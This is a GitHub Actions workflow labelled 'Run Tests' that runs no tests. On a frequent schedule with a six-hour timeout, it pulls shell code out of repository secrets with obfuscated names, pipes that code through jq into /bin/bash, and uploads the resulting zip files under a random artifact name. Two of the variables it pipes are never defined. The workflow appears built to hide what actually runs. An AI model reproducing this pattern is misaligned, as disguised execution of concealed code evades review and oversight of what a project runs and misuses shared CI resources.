name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '35 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          xxj400: ${{ secrets.xxj400 }}
        run: |
          printf '%s' "$xxj400" | jq -r .qhd3 | /bin/bash
          printf '%s' "$s0" | jq -r .sqljx74 | /bin/bash
          printf '%s' "$zrql98" | jq -r .a2350 | /bin/bash

      - name: Save output
        uses: actions/upload-artifact@v4
        with:
          name: ncrFeTJz
          path: "*.zip"
          retention-days: 1
